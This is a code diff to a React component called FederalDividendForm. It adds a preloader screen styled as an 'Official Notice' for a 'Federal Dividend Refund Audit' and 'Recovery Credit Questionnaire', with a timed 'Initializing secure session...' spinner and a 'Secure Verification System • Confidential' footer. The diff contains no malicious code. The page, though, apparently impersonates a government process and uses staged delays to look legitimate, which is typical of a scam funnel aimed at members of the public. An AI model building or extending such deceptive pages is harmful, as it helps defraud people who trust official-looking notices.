@@ -50,7 +50,42 @@ function LoadingSpinner({ message }: { message: string }) {
   )
 }
 
+function InitialPreloader() {
+  return (
+    <div className="min-h-screen bg-gray-100 flex flex-col items-center justify-center p-4">
+      <div className="w-full max-w-md bg-white rounded-lg shadow-lg overflow-hidden border-t-4 border-red-600">
+        <div className="px-6 py-8 text-center space-y-4">
+          <h2 className="text-lg font-bold text-gray-900 uppercase tracking-wide">
+            Official Notice
+          </h2>
+          
+          <div className="space-y-1">
+            <h1 className="text-xl font-bold text-red-600 uppercase tracking-wide">
+              Federal Dividend Refund Audit
+            </h1>
+            <p className="text-base font-semibold text-gray-800">
+              RECOVERY CREDIT QUESTIONNAIRE
+            </p>
+          </div>
+
+          <div className="flex items-center justify-center gap-3 py-4">
+            <Loader2 className="w-5 h-5 text-red-600 animate-spin" />
+            <span className="text-gray-600 text-sm">Initializing secure session...</span>
+          </div>
+        </div>
+
+        <div className="bg-gray-50 px-4 py-3 border-t border-gray-200">
+          <p className="text-center text-xs text-gray-500 uppercase tracking-wider">
+            Secure Verification System • Confidential • 2026
+          </p>
+        </div>
+      </div>
+    </div>
+  )
+}
+
 export default function FederalDividendForm() {
+  const [isInitializing, setIsInitializing] = useState(true)
   const [step, setStep] = useState(1)
   const [isLoading, setIsLoading] = useState(false)
   const [loadingMessage, setLoadingMessage] = useState("")
@@ -68,6 +103,18 @@ export default function FederalDividendForm() {
   const [showResults, setShowResults] = useState(false)
 
   const progress = step === 1 ? 25 : step === 2 ? 50 : step === 3 ? 75 : 100
+
+  // Initial preloader effect
+  useEffect(() => {
+    const timer = setTimeout(() => {
+      setIsInitializing(false)
+    }, 2500)
+    return () => clearTimeout(timer)
+  }, [])
+
+  if (isInitializing) {
+    return <InitialPreloader />
+  }
 
   const handleTransition = (nextStep: number, message: string, delay: number = 2000) => {
     setIsLoading(true)
